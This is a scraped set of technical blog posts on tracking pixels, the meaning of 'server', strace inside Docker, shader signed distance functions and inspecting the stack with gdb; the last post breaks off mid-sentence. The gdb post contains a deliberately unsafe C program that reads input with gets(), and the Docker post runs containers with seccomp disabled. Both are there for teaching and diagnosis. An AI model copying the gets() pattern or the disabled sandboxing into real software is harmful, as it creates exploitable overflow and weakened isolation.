{"url": "https://jvns.ca/blog/how-tracking-pixels-work/", "title": "How tracking pixels work", "content": "\n     \n\n I spent some time talking to a reporter yesterday about how\nadvertisers track people on the internet. We had a really fun time looking at\nFirefox’s developer tools together (I’m not an internet privacy expert, but I\ndo know how to use the network tab in developer tools!) and I learned a few\nthings about how tracking pixels actually work in practice! \n\n the question: how does Facebook know that you went to Old Navy? \n\n I often hear about this slightly creepy internet experience: you’re looking at\na product online, and a day later see an ad for the same boots or whatever that\nyou were looking at. This is called “retargeting”, but how does it actually\nwork exactly in practice? \n\n In this post we’ll experiment a bit and see exactly how Facebook can know what\nproducts you’ve looked at online! I’m using Facebook as an example in this blog\npost just because it’s easy to find websites with Facebook tracking pixels on\nthem but of course almost every internet advertising company does this kind of\ntracking. \n\n the setup: allow third party trackers, turn off my adblocker \n\n I use Firefox, and by default Firefox blocks a lot of this kind of tracking. So\nI needed to modify my Firefox privacy settings to get this tracking to work. \n\n I changed my privacy settings from the default\n( screenshot ) to a custom setting that allows\nthird-party trackers ( screenshot ). I\nalso disabled some privacy extensions I usually have running. \n\n tracking pixels: it’s not the gif, it’s the URL + query parameters \n\n A tracking pixel is a 1x1 transparent gif that sites use to track you. By itself, obviously a tiny 1x1 gif doesn’t do too much. So how do tracking pixels track you? 2 ways: \n\n \n Sites use the  URL and query parameters  in the tracking pixel to add extra information, like the URL of the page you’re visiting. So instead of just requesting  https://www.facebook.com/tr/  (which is a 44-byte 1x1 gif), it’ll request  https://www.facebook.com/tr/?the_website_you're_on . (email marketers use similar tricks to figure out if you’ve opened an email, by giving the tracking pixel a unique URL) \n Sites send  cookies  with the tracking pixel so that they can tell that the person who visited oldnavy.com is the same as the person who’s using Facebook on the same computer. \n \n\n the Facebook tracking pixel on Old Navy’s website \n\n To test this out, I went to look at a product on the Old Navy site with the URL  https://oldnavy.gap.com/browse/product.do?pid=504753002&cid=1125694&pcid=1135640&vid=1&grid=pds_0_109_1  (a “Soft-Brushed Plaid Topcoat for Men”). \n\n When I did that, the Javascript running on that page (presumably  this code ) sent a request to facebook.com that looks like this in Developer tools: (I censored most of the cookie values because some of them are my login cookies :) ) \n\n \n\n Let’s break down what’s happening: \n\n \n My browser sends a request to\n \nhttps://www.facebook.com/tr/?id=937725046402747&ev=PageView&dl=https%3A%2F%2Foldnavy.gap.com%2Fbrowse%2Fproduct.do%3Fpid%3D504753002%26cid%3D1125694%26pcid%3Dxxxxxx0%26vid%3D1%26grid%3Dpds_0_109_1%23pdp-page-content&rl=https%3A%2F%2Foldnavy.gap.com%2Fbrowse%2Fcategory.do%3Fcid%3D1135640%26mlink%3D5155%2Cm_mts_a&if=false&ts=1576684838096&sw=1920&sh=1080&v=2.9.15&r=stable&a=tmtealium&ec=0&o=30&fbp=fb.1.1576684798512.1946041422&it=15xxxxxxxxxx4&coo=false&rqm=GET\n \n With that request, it sends a cookie called  fr  which is set to  10oGXEcKfGekg67iy.AWVdJq5MG3VLYaNjz4MTNRaU1zg.Bd-kxt.KU.F36.0.0.Bd-kx6.  (which I guess is my Facebook ad tracking ID) \n \n\n So the three most notable things that are being sent in the tracking pixel query string are: \n\n \n the page I visited:  https://oldnavy.gap.com/browse/product.do?pid=504753002&cid=1125694&pcid=1135640&vid=1&grid=pds_0_109_1#pdp-page-content \n the page that referred me to that page:  https://oldnavy.gap.com/browse/category.do?cid=1135640&mlink=5155,m_mts_a \n an identifier cookie for me:  10oGXEcKfGekg67iy.AWVdJq5MG3VLYaNjz4MTNRaU1zg.Bd-kxt.KU.F36.0.0.Bd-kx6. \n \n\n now let’s visit Facebook! \n\n Next, let’s visit Facebook, where I’m logged in. What cookies is my browser sending Facebook? \n\n Unsurprisingly, it’s the same  fr  cookie from before:\n 10oGXEcKfGekg67iy.AWVdJq5MG3VLYaNjz4MTNRaU1zg.Bd-kxt.KU.F36.0.0.Bd-kx6. . So\nFacebook now definitely knows that I (Julia Evans, the person with this Facebook\naccount) visited the Old Navy website a couple of minutes ago and looked at a\n“Soft-Brushed Plaid Topcoat for Men”, because they can use that identifier to\nmatch up the data. \n\n these cookies are third-party cookies \n\n The  fr  cookie that Facebook is using to track what websites I go to is called\na “third party cookie”, because Old Navy’s website is using it to identify me\nto a third party (facebook.com). This is different from first-party cookies,\nwhich are used to keep you logged in. \n\n Safari and Firefox both block many third-party cookies by default (which is why I\nhad to change Firefox’s privacy settings to get this experiment to work), and\nas of today Chrome doesn’t (presumably because Chrome is owned by an ad company). \n\n sites have lots of tracking pixels \n\n Like I expected, sites have  lots  of tracking pixels. For example,\nwrangler.com loaded 19 different tracking pixels in my browser from a bunch of\ndifferent domains. The tracking pixels on wrangler.com came from:\n ct.pinterest.com ,  af.monetate.net ,  csm.va.us.criteo.net ,  google-analytics.com ,\n dpm.demdex.net ,  google.ca ,  a.tribalfusion.com ,  data.photorank.me ,\n stats.g.doubleclick.net ,  vfcorp.dl.sc.omtrdc.net ,  ib.adnxs.com ,\n idsync.rlcdn.com ,  p.brsrvr.com , and  adservice.google.com . \n\n For most of these trackers, Firefox helpfully pointed out that it would have\nblocked them if I was using the standard Firefox privacy settings: \n\n \n\n why browsers matter \n\n The reason browsers matter so much is that your browser has the final word on\nwhat information it sends about you to which websites. The Javascript on the\nOld Navy’s website can ask your browser to send tracking information about you\nto Facebook, but your browser doesn’t have to do it! It can decide “oh yeah,\nI know that facebook.com/tr/ is a tracking pixel, I don’t want my users to be\ntracked, I’m just not going to send that request”. \n\n And it can make that behaviour configurable by changing browser settings or\ninstalling browser extensions, which is why there are lots of privacy extensions. \n\n it’s fun to see how this works! \n\n I think it’s fun to see how cookies / tracking pixels are used to track you in\npractice, even if it’s kinda creepy! I sort of knew how this worked before but\nI’d never actually looked at the cookies on a tracking pixel myself or what\nkind of information it was sending in its query parameters exactly. \n\n And if you know how it works, it’s easier to figure out how to be tracked less! \n\n what can you do? \n\n I do a few small things to get tracked on the internet a little less: \n\n \n install an adblocker (like ublock origin or something), which will block a lot of tracker domains \n use Firefox/Safari instead of Chrome (which have stronger default privacy settings right now) \n use the  Facebook Container  Firefox extension, which takes extra steps to specifically prevent Facebook from tracking you \n \n\n There are still lots of other ways to be tracked on the internet (especially\nwhen using mobile apps where you don’t have the same kind of control as with\nyour browser), but I like understanding how this one method of tracking works\nand think it’s nice to be tracked a little bit less. \n\n \n.entry-content code {\n    overflow-wrap: anywhere;\n    word-break: break-all;\n}\n \n\n"},
{"url": "https://jvns.ca/blog/2019/12/26/whats-a-server/", "title": "\"server\" is hard to define", "content": "\n     \n\n Somebody asked me recently what a server was, and I had a harder time\nexplaining it than I expected!  I thought I was going to be able to give some\nkind of simple pithy answer but it kind of got away from me. So here’s a short\nexploration of what the word “server” can mean: \n\n a server responds to requests \n\n A server definitely responds to requests. A few examples: \n\n webserver: \n\n Me: \"please give me google.com\" \nServer: \"here is the HTML for that webpage\"\n \n\n bittorrent server: \n\n Me: \"I would like this chunk of the good wife season 2\"\nServer: \"here are some of the  bytes from that .avi file!\"\n \n\n mail server: \n\n Me: \"can you send this email to julia@jvns.ca\"\nServer: \"I sent it!\"\n \n\n But what is a server actually specifically exactly? \n\n a server is a program \n\n My first instinct is to say “a server is a program” because for example a “the\nwordpress server” is a PHP program, so let’s start with that. \n\n A server is usually a program that listens on a  port  (like 80). For\nexample, if we’re talking about a Rails webserver, then the program is a Ruby\nprogram that’s listening on a port for HTTP requests. \n\n For example, we can start a Python server to serve files out of the current directory. \n\n $ python3 -m http.server & \nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..\n \n\n and send requests to it with  curl : \n\n $ curl localhost:8000/config.yaml\nbaseurl: https://jvns.ca\ndisablePathToLower: true\nlanguageCode: en-us\ntitle: Julia Evans\nauthor: Julia Evans\n...\n \n\n a server might be a virtual machine \n\n But often when I talk about “a server” at work, I’ll use it in a sentence like\n“I’m going to SSH to that server to see what’s going on with it”, or “wow, that\nserver is swapping a lot, that’s bad!“. \n\n So in those cases clearly I don’t mean a program when I say “that server” (you\ncan’t ssh to a program, though the ssh server that runs on the VM is itself a program!), I mean the AWS instance that the server program is\nrunning on. That AWS instance is a virtual machine, which looks like a computer\nin a lot of ways (it’s running an operating system!) but it isn’t a physical\ncomputer. \n\n a server might be a container \n\n Similarly to how your server might be a virtual machine, it could also be a\ncontainer running in a virtual machine. So “the server is running out of\nmemory” could mean “the container is running out of memory and crashing” which\nreally means “we set a cgroup memory limit on this container and the programs\nin the container with that cgroup exceeded the limit so the Linux kernel OOM\nkilled them”. \n\n But containers make everything a lot more complicated so I think we should stop\nthere for now. \n\n a server is a computer \n\n But also when you  buy  a server from Dell or some other computer company,\nyou’re not buying a virtual machine, you’re buying an actual physical machine. \n\n Usually these computers are in building datacenters. For example in this video\nyou can see thousands of servers in a Google datacenter. \n\n \n\n The computers in this datacenter don’t look like the computers in my house!\nThey’re short and wide because they’re designed to fit into these giant racks\nof servers. For example if you search Newegg for  1U server  you’ll find servers that are 1\n“ rack unit ” high, and a rack unit is 1.75 inches. There are also 2U servers which are twice as high. \n\n Here’s a picture of a 1U server I found on Newegg: \n\n \n\n I’ve only seen a server rack once at the  Internet\nArchive  which is in what used to be a church in San\nFrancisco, and it was really cool to realize – wow, when I use the Wayback\nMachine it’s using the actual computers in this room! \n\n “the server” might be 1000 computers \n\n Next, let’s say we’re talking about how Gmail works. You might ask “hey, when I search my email to find my boarding pass, does that happen in the frontend or on the server?”. \n\n The answer is “it happens on the server”, but what’s “the server” here? There’s\nnot just one computer or program or virtual machine that searches your Gmail,\nthere are probably lots of computers and programs at Google that are reponsible\nfor that and they’re probably distributed across many datacenters all over the\nworld. \n\n And even if we’re just talking about doing 1 search, there could easily be 20\ndifferent computers in 3 different countries involved in just running that 1\nsearch. \n\n So the words “the server” in  “oh yeah, that happens on the server” mean\nsomething kind of complicated here – what you’re actually saying is something\n“well the browser makes a request, and that request does  something , but I’m\nnot really going to worry about what because the important thing is just that\nthe browser made a request and got some kind of response back.” \n\n what happens when I search my email for a boarding pass? \n\n When I search for “boarding” in my email, the Javascript running on the\nfrontend puts together this request. It’s mostly indecipherable but it\ndefinitely contains the word “boarding”: \n\n {\n  \"1\": {\n    \"1\": 79,\n    \"2\": 101,\n    \"4\": \"boarding\",\n    \"5\": {\n      \"5\": 0,\n      \"12\": \"1577376926313\",\n      \"13\": -18000000\n    },\n    \"6\": \"itemlist-ViewType(79)-5\",\n    \"7\": 1,\n    \"8\": 2000,\n    \"10\": 0,\n    \"14\": 1,\n    \"16\": {\n      \"1\": 1,\n      \"2\": 0,\n      \"3\": 0,\n      \"7\": 1\n    },\n    \"19\": 1\n  },\n  \"3\": {\n    \"1\": \"0\",\n    \"2\": 5,\n    \"5\": 1,\n    \"6\": 1,\n    \"7\": 1\n  }\n}\n \n\n We get a response back which is large and complicated and definitely contains search results from my email about boarding passes. Here’s an excerpt: \n\n \"your electronic boarding pass. You could also be asked to display this \\nmessage to airport security. * PLEASE NOTE: A printable\",\n\"the attached boarding pass to present at the airport. Manage your booking \\nBooking Details Passenger: JULIA EVANS Booking\",\n\"Electronic boarding pass is not offered for your flight. Click the link \\nbelow to access the PRINTABLE VERSION of your boarding\",\n\"Save time at the airport Save time at the airport Web version\",\n\"GET YOUR BOARDING PASS IN ADVANCE > You can now check in for your flight \\nand you will receive a boarding pass > allowing\",\n\"Save time at the airport Save time at the airport Web version\",\n\"Booking Confirmation Booking Reference: xxxxxx Date of issue: xxxxxxxxxxxx \\nSelect Seats eUpgrade\",\n\"your electronic boarding pass. You could also be asked to display this \\nmessage to airport security. * PLEASE NOTE: A printable\",\n\"your electronic boarding pass. You could also be asked to display this \\nmessage to airport security. * PLEASE NOTE: A printable\",\n\"Save time at the airport Save time at the airport Web version\",\n\"house was boarded up during the last round of bombings. I have no spatial \\nimagination and cannot picture the house in three\",\n\"Booking Confirmation Booking Reference: xxxxxx Date of issue: xxxxxxxxxxxx \\nSelect Seats eUpgrade\"\n\"required when boarding a flight to Canada. For more details, please visit \\nCanada.ca/eTA . - Terms and Conditions of Sale\",\n\"Your KLM boarding pass(s) on XXXXXX To: [image: KLM SkyTeam] Boarding \\ninformation Thank you for checking in! Attached you\",\n\"Boarding information Thank you for checking in! Attached you will find your \\nboarding pass and/or other documents. Below\",\n\"jetBlue® Your upcoming trip to SEATTLE, WA on xxxxxxxxxxx Flight status \\nBaggage info Airport info TAG\",\n\"your electronic boarding pass. You could also be asked to display this \\nmessage to airport security. * PLEASE NOTE: A printable\"\n \n\n That request got sent to 172.217.13.197:443, which corresponds to some edge\nserver near me.  There were probably many other computers involved in searching\nmy email than just the first one who got my request, but the nice thing about\nthis is that we don’t need to care exactly what happened behind the scenes! The\nbrowser sent a request, and it got search results back, and it\ndoesn’t need to know what servers. \n\n We can just say “it happens on the server” and not worry too much about the\nambiguity of what exactly that means (until something weird goes wrong :)). \n\n the meaning of “server” depends on the context \n\n So we’ve arrived somewhere a little bit interesting – at first when I thought\nabout the question “what’s a server?” I really thought there was going to be a\nsingle simple answer! But it turns out that if you look at sentences where we\nuse the word “server” it can actually refer to a lot of different things in a\nway that can be confusing: \n\n \n “Let me just ssh into the server and see what’s going on” => a virtual machine (or possibly a computer) \n “I sent a SIGTERM to the server and that fixed the problem” => a program \n “Let’s look at the server code” => a program \n “Let’s buy 20 of those 2U servers” => a computer \n “We need to add more server capacity” => a program and a virtual machine probably \n “That happens on the server” => possibly some complex distributed system \n \n\n"},
{"url": "https://jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/", "title": "Why strace doesn't work in Docker", "content": "\n     \n\n While editing the capabilities page of the  how containers work  zine, I found myself\ntrying to explain why  strace  doesn’t work in a Docker container. \n\n The problem here is – if I run  strace  in a Docker container on my laptop, this happens: \n\n $ docker run  -it ubuntu:18.04 /bin/bash\n$ # ... install strace ...\nroot@e27f594da870:/# strace ls\nstrace: ptrace(PTRACE_TRACEME, ...): Operation not permitted\n \n\n strace works using the  ptrace  system call, so if  ptrace  isn’t\nallowed, it’s definitely not gonna work! This is pretty easy to fix – on\nmy machine, this fixes it: \n\n docker run --cap-add=SYS_PTRACE  -it ubuntu:18.04 /bin/bash\n \n\n But I wasn’t interested in fixing it, I wanted to know why it happens. So\nwhy does strace not work, and why does  --cap-add=SYS_PTRACE  fix it? \n\n hypothesis 1: container processes are missing the  CAP_SYS_PTRACE  capability \n\n I always thought the reason was that Docker container processes by\ndefault didn’t have the  CAP_SYS_PTRACE  capability. This is consistent\nwith it being fixed by  --cap-add=SYS_PTRACE , right? \n\n But this actually doesn’t make sense for 2 reasons. \n\n Reason 1 : Experimentally, as a regular user, I can strace on any process run by my\nuser. But if I check if my current process has the  CAP_SYS_PTRACE  capability, I don’t: \n\n $ getpcaps $$\nCapabilities for `11589': =\n \n\n Reason 2 :  man capabilities  says this about  CAP_SYS_PTRACE : \n\n CAP_SYS_PTRACE\n       * Trace arbitrary processes using ptrace(2);\n \n\n So the point of  CAP_SYS_PTRACE  is to let you ptrace  arbitrary \nprocesses owned by any user, the way that root usually can. You shouldn’t\nneed it to just ptrace a regular process owned by your user. \n\n And I tested this a third way – I ran a Docker container with  docker\nrun --cap-add=SYS_PTRACE  -it ubuntu:18.04 /bin/bash , dropped the\n CAP_SYS_PTRACE  capability, and I could still strace processes even\nthough I didn’t have that capability anymore. What? Why? \n\n hypothesis 2: something about user namespaces??? \n\n My next (much less well-founded) hypothesis was something along the lines\nof “um, maybe the process is in a different user namespace and strace\ndoesn’t work because of… reasons?” This isn’t really coherent but\nhere’s what happened when I looked into it. \n\n Is the container process in a different user namespace? Well, in the container: \n\n root@e27f594da870:/# ls /proc/$$/ns/user -l\n... /proc/1/ns/user -> 'user:[4026531837]'\n \n\n On the host: \n\n bork@kiwi:~$ ls /proc/$$/ns/user -l\n... /proc/12177/ns/user -> 'user:[4026531837]'\n \n\n Because the user namespace ID ( 4026531837 ) is the same, the root user\nin the container is the exact same user as the root user on the host. So\nthere’s definitely no reason it shouldn’t be able to strace processes\nthat it created! \n\n This hypothesis doesn’t make much sense but I hadn’t realized that the\nroot user in a Docker container is the same as the root user on the host,\nso I thought that was interesting. \n\n hypothesis 3: the ptrace system call is being blocked by a seccomp-bpf rule \n\n I also knew that Docker uses seccomp-bpf to stop container processes from\nrunning a lot of system calls. And ptrace is in the  list of system calls\nblocked by Docker’s default seccomp\nprofile ! (actually the\nlist of allowed system calls is a whitelist, so it’s just that ptrace is\nnot in the default whitelist. But it comes out to the same thing.) \n\n That easily explains why strace wouldn’t work in a Docker container – if\nthe  ptrace  system call is totally blocked, then of course you can’t\ncall it at all and strace would fail. \n\n Let’s verify this hypothesis – if we disable all seccomp rules, can we\nstrace in a Docker container? \n\n $ docker run --security-opt seccomp=unconfined -it ubuntu:18.04  /bin/bash\n$ strace ls\nexecve(\"/bin/ls\", [\"ls\"], 0x7ffc69a65580 /* 8 vars */) = 0\n... it works fine ...\n \n\n Yes! It works! Great. Mystery solved, except… \n\n why does  --cap-add=SYS_PTRACE  fix the problem? \n\n What we still haven’t explained is: why does  --cap-add=SYS_PTRACE  would\nfix the problem? \n\n The man page for  docker run  explains the  --cap-add  argument this way: \n\n --cap-add=[]\n   Add Linux capabilities\n \n\n That doesn’t have anything to do with seccomp rules! What’s going on? \n\n let’s look at the Docker source code. \n\n When the documentation doesn’t help, the only thing to do is go look at\nthe source. \n\n The nice thing about Go is, because dependencies are often vendored in a\nGo repository, you can just grep the repository to figure out where the\ncode that does a thing is. So I cloned  github.com/moby/moby  and grepped\nfor some things, like  rg CAP_SYS_PTRACE . \n\n Here’s what I think is going on. In containerd’s seccomp implementation, in\n contrib/seccomp/seccomp_default.go ,\nthere’s a bunch of code that makes sure that if a process has a\ncapability, then it’s also given access (through a seccomp rule) to use\nthe system calls that go with that capability. \n\n \t\tcase \"CAP_SYS_PTRACE\":\n\t\t\ts.Syscalls = append(s.Syscalls, specs.LinuxSyscall{\n\t\t\t\tNames: []string{\n\t\t\t\t\t\"kcmp\",\n\t\t\t\t\t\"process_vm_readv\",\n\t\t\t\t\t\"process_vm_writev\",\n\t\t\t\t\t\"ptrace\",\n\t\t\t\t},\n\t\t\t\tAction: specs.ActAllow,\n\t\t\t\tArgs:   []specs.LinuxSeccompArg{},\n\t\t\t})\n \n\n There’s some other code that seems to do something very similar in\n profiles/seccomp/seccomp.go \nin moby and the  default seccomp\nprofile ,\nso it’s possible that that’s what’s doing it instead. \n\n So I think we have our answer! \n\n --cap-add  in Docker does a little more than what it says \n\n The upshot seems to be that  --cap-add  doesn’t do exactly what it says\nit does in the man page, it’s more like\n --cap-add-and-also-whitelist-some-extra-system-calls-if-required . Which makes\nsense! If you have a capability like  CAP_SYS_PTRACE  which is supposed\nto let you use the  process_vm_readv  system call but that system call is\nblocked by a seccomp profile, that’s not going to help you much! \n\n So allowing the  process_vm_readv  and  ptrace  system calls when you\ngive the container  CAP_SYS_PTRACE  seems like a reasonable choice. \n\n strace actually does work in newer versions of Docker \n\n As of  this commit  (docker 19.03), Docker does actually allow the  ptrace  system calls for kernel versions newer than 4.8. \n\n But the Docker version on my laptop is 18.09.7, so it predates that commit. \n\n that’s all! \n\n This was a fun small thing to investigate, and I think it’s a nice\nexample of how containers are made of lots of moving pieces that work\ntogether in not-completely-obvious ways. \n\n If you liked this, you might like my new zine called  How Containers Work  that explains the Linux kernel features that make containers work in 24 pages. You can read the pages on  capabilities  and  seccomp-bpf  from the zine. \n\n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2020/03/15/writing-shaders-with-signed-distance-functions/", "title": "Getting started with shaders: signed distance functions!", "content": "\n     \n\n Hello! A while back I learned how to make fun shiny spinny things like this\nusing shaders: \n\n \n \n \n\n My shader skills are still extremely basic, but this fun spinning thing turned out to be a lot\neasier to make than I thought it would be to make (with a lot of copying of\ncode snippets from other people!). \n\n The big idea I learned when doing this was something called “signed distance\nfunctions”, which I learned about from a very fun tutorial called  Signed Distance Function\ntutorial: box & balloon . \n\n In this post I’ll go through the steps I used to learn to write a simple shader\nand try to convince you that shaders are not that hard to get started with! \n\n examples of more advanced shaders \n\n If you haven’t seen people do really fancy things with shaders, here are a couple: \n\n \n this very complicated shader that is like a realistic video of a river:  https://www.shadertoy.com/view/Xl2XRW \n a more abstract (and shorter!) fun shader with a lot of glowing circles:  https://www.shadertoy.com/view/lstSzj \n \n\n step 1: my first shader \n\n I knew that you could make shaders on shadertoy, and so I went to\n https://www.shadertoy.com/new . They give you a default shader to start with\nthat looks like this: \n\n \n \n \n\n Here’s the code: \n\n void mainImage( out vec4 fragColor, in vec2 fragCoord )\n{\n    // Normalized pixel coordinates (from 0 to 1)\n    vec2 uv = fragCoord/iResolution.xy;\n\n    // Time varying pixel color\n    vec3 col = 0.5 + 0.5*cos(iTime+uv.xyx+vec3(0,2,4));\n\n    // Output to screen\n    fragColor = vec4(col,1.0);\n}\n \n\n This doesn’t do anything that exciting, but it already taught me the basic structure of a shader program! \n\n the idea: map a pair of coordinates (and time) to a colour \n\n The idea here is that you get a pair of coordinates as an input ( fragCoord )\nand you need to output a RGBA vector with the colour of that. The function can\nalso use the current time ( iTime ), which is how the picture changes over\ntime. \n\n The neat thing about this programming model (where you map a pair of\ncoordinates and the time to) is that it’s extremely trivially parallelizable. I\ndon’t understand a lot about GPUs but my understanding is that this kind of\ntask (where you have 10000 trivially parallelizable calculations to do at\nonce) is exactly the kind of thing GPUs are good at. \n\n step 2: iterate faster with  shadertoy-render \n\n After a while of playing with shadertoy, I got tired of having to click\n“recompile” on the Shadertoy website every time I saved my shader. \n\n I found a command line tool that will watch a file and update the animation in real time every time I save called  shadertoy-render . So now I can just run: \n\n shadertoy-render.py circle.glsl \n \n\n and iterate way faster! \n\n step 3: draw a circle \n\n Next I thought – I’m good at math! I can use some basic trigonometry to draw a\nbouncing rainbow circle! \n\n I know the equation for a circle ( x**2 + y**2 = whatever !), so I wrote some code to do that: \n\n \n \n \n\n Here’s the code:  (which you can also  see on shadertoy ) \n\n void mainImage( out vec4 fragColor, in vec2 fragCoord )\n{\n    // Normalized pixel coordinates (from 0 to 1)\n    vec2 uv = fragCoord/iResolution.xy;\n    // Draw a circle whose center depends on what time it is\n    vec2 shifted = uv - vec2((sin(iGlobalTime) + 1)/2, (1 + cos(iGlobalTime)) / 2);\n    if (dot(shifted, shifted) < 0.03) {\n        // Varying pixel colour\n        vec3 col = 0.5 + 0.5*cos(iGlobalTime+uv.xyx+vec3(0,2,4));\n        fragColor = vec4(col,1.0);\n    } else {\n        // make everything outside the circle black\n        fragColor = vec4(0,0,0,1.0);\n    }\n}\n \n\n This takes the dot product of the coordinate vector  fragCoord  with itself,\nwhich is the same as calculating  x^2 + y^2 . I played with the center of the circle a little bit in this one too – I made the center  vec2((sin(iGlobalTime) + 1)/2, (1 + cos(faster)) / 2) , which means that the center of the circle also goes in a circle depending on what time it is. \n\n shaders are a fun way to play with math! \n\n One thing I think is fun about this already (even though we haven’t done\nanything super advanced!) is that these shaders give us a fun visual way to\nplay with math – I used  sin  and  cos  to make something go in a circle, and\nif you want to get some better intuition about how trigonometric work, maybe\nwriting shaders would be a fun way to do that! \n\n I love that you get instant visual feedback about your math code – if you\nmultiply something by 2, things get bigger! or smaller! or faster! or slower!\nor more red! \n\n but how do we do something really fancy? \n\n This bouncing circle is nice but it’s really far from the super fancy things\nI’ve seen other people do with shaders. So what’s the next step? \n\n idea: instead of using if statements, use signed distance functions! \n\n In my circle code above, I basically wrote: \n\n if (dot(uv, uv) < 0.03) {\n    // code for inside the circle\n} else {\n    // code for outside the circle\n}\n \n\n But the problem with this (and the reason I was feeling stuck) is that it’s not\nclear how it generalizes to more complicated shapes! Writing a bajillion if\nstatements doesn’t seem like it would work well. And how do people render those\n3d shapes anyway? \n\n So!  Signed distance functions  are a different way to define a shape.\nInstead of using a hardcoded if statement, instead you define a  function \nthat tells you, for any point in the world, how far away that point is from\nyour shape. For example, here’s a signed distance function for a sphere. \n\n float sdSphere( vec3 p, float center )\n{\n  return length(p)-center;\n}\n \n\n Signed distance functions are awesome because they’re: \n\n \n simple to define! \n easy to compose! You can take a union / intersection / difference with some simple math if you want a sphere with a chunk taken out of it. \n easy to rotate / stretch / bend! \n \n\n the steps to making a spinning top \n\n When I started out I didn’t understand what code I needed to write to make a shiny spinning thing. It turns out that these are the basic steps: \n\n \n Make a signed distance function for the shape I want (in my case an octahedron) \n Raytrace the signed distance function so you can display it in a 2D picture\n(or raymarch? The tutorial I used called it raytracing and I don’t\nunderstand the difference between raytracing and raymarching yet) \n Write some code to texture the surface of your shape and make it shiny \n \n\n I’m not going to explain signed distance functions or raytracing in detail in this post\nbecause I found this  AMAZING tutorial on signed distance functions  that is very\nfriendly and honestly it does a way better job than I could do. It\nexplains how to do the 3 steps above and the code has a ton of comments and it’s great. \n\n \n The tutorial is called “SDF Tutorial: box & balloon” and it’s here:  https://www.shadertoy.com/view/Xl2XWt \n Here are tons of signed distance functions that you can copy and paste into your code  http://www.iquilezles.org/www/articles/distfunctions/distfunctions.htm  (and ways to compose them to make other shapes) \n \n\n step 4: copy the tutorial code and start changing things \n\n Here I used the time honoured programming practice here of “copy the code and change things in a chaotic way until I get the result I want”. \n\n My final shader of a bunch of shiny spinny things is here:  https://www.shadertoy.com/view/wdlcR4 \n\n The animation comes out looking like this:\n \n \n \n\n Basically to make this I just copied the tutorial on signed distance functions that renders the shape based on the signed distance function and: \n\n \n changed  sdfBalloon  to  sdfOctahedron  and made the octahedron spin instead of staying still in my signed distance function \n changed the  doBalloonColor  colouring function to make it shiny \n made there be lots of octahedrons instead of just one \n \n\n making the octahedron spin! \n\n Here’s some the I used to make the octahedron spin! This turned out to be\nreally simple: first copied an octahedron signed distance function from  this\npage \nand then added a  rotate  to make it rotate based on time and then suddenly\nit’s spinning! \n\n vec2 sdfOctahedron( vec3 currentRayPosition, vec3 offset ){\n    vec3 p = rotate((currentRayPosition), offset.xy, iTime * 3.0) - offset;\n    float s = 0.1; // what is s?\n    p = abs(p);\n    float distance = (p.x+p.y+p.z-s)*0.57735027;\n    float id = 1.0;\n    return vec2( distance,  id );\n}\n \n\n making it shiny with some noise \n\n The other thing I wanted to do was to make my shape look sparkly/shiny. I used\na noise funciton that I found in  this github gist  to\nmake the surface look textured. \n\n Here’s how I used the noise function. Basically I just changed parameters to\nthe noise function mostly at random (multiply by 2? 3? 1800? who knows!) until\nI got an effect I liked. \n\n float x = noise(rotate(positionOfHit, vec2(0, 0), iGlobalTime * 3.0).xy * 1800.0);\nfloat x2 = noise(lightDirection.xy * 400.0);\nfloat y = min(max(x, 0.0), 1.0);\nfloat y2 = min(max(x2, 0.0), 1.0) ;\nvec3 balloonColor = vec3(y , y  + y2, y  + y2);\n \n\n writing shaders is fun! \n\n That’s all! I had a lot of fun making this thing spin and be shiny. If you also want to\nmake fun animations with shaders, I hope this helps you make your cool thing! \n\n As usual with subjects I don’t know tha well, I’ve probably said at least one\nwrong thing about shaders in this post, let me know what it is! \n\n Again, here are the 2 resources I used: \n\n \n “SDF Tutorial: box & balloon”:  https://www.shadertoy.com/view/Xl2XWt  (which is really fun to modify and play around with) \n Tons of signed distance functions that you can copy and paste into your code  http://www.iquilezles.org/www/articles/distfunctions/distfunctions.htm \n \n\n"},
{"url": "https://jvns.ca/blog/2021/05/17/how-to-look-at-the-stack-in-gdb/", "title": "How to look at the stack with gdb", "content": "\n     \n\n I was chatting with someone yesterday and they mentioned that they don’t really\nunderstand exactly how the stack works or how to look at it. \n\n So here’s a quick walkthrough of how you can use gdb to look at the stack of a C\nprogram. I think this would be similar for a Rust program, but I’m going to use\nC because I find it a little simpler for a toy example and also you can do Terrible\nThings in C more easily. \n\n our test program \n\n Here’s a simple C program that declares a few variables and reads two strings\nfrom standard input. One of the strings is on the heap, and one is on the\nstack. \n\n #include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    char stack_string[10] = \"stack\";\n    int x = 10;\n    char *heap_string;\n\n    heap_string = malloc(50);\n\n    printf(\"Enter a string for the stack: \");\n    gets(stack_string);\n    printf(\"Enter a string for the heap: \");\n    gets(heap_string);\n    printf(\"Stack string is: %s\\n\", stack_string);\n    printf(\"Heap string is: %s\\n\", heap_string);\n    printf(\"x is: %d\\n\", x);\n}\n \n\n This program uses the extremely unsafe function  gets  which you should never\nuse, but that’s on purpose – we learn more when things go wrong. \n\n step 0: compile the program. \n\n We can compile it with  gcc -g -O0 test.c -o test . \n\n The  -g  flag compiles the program with debugging symbols, which is going to\nmake it a lot easier to look at our variables. \n\n -O0  tells gcc to turn off optimizations which I did just to make sure our  x \nvariable didn’t get optimized out. \n\n step 1: start gdb \n\n We can start gdb like this: \n\n $ gdb ./test\n \n\n It prints out some stuff about the GPL and then gives a prompt. Let’s create a breakpoint on the  main  function. \n\n (gdb) b main\nBreakpoint 1 at 0x1171: file test.c, line 4.\n \n\n Then we can run the program: \n\n (gdb) run\nStarting program: /home/bork/work/homepage/test \n\nBreakpoint 1, main () at test.c:4\n4\tint main() {\n \n\n Okay, great! The program is running and we can start looking at the stack \n\n step 2: look at our variables’ addresses \n\n Let’s start out by learning about our variables. Each of them has an address in\nmemory, which we can print out like this: \n\n (gdb) p &x\n$3 = (int *) 0x7fffffffe27c\n(gdb) p &heap_string\n$2 = (char **) 0x7fffffffe280\n(gdb) p &stack_string\n$4 = (char (*)[10]) 0x7fffffffe28e\n \n\n So if we look at the stack at those addresses, we should be able to see all of\nthese variables! \n\n concept: the stack pointer \n\n We’re going to need to use the stack pointer so I’ll try to explain it really\nquickly. \n\n There’s an x86 register called ESP called the “stack pointer”. Basically\nit’s the address of the start of the stack for the current function. In gdb you can access it\nwith  $sp . When you call a new function or return from a function, the value\nof the stack pointer changes. \n\n step 3: look at our variables on the stack at 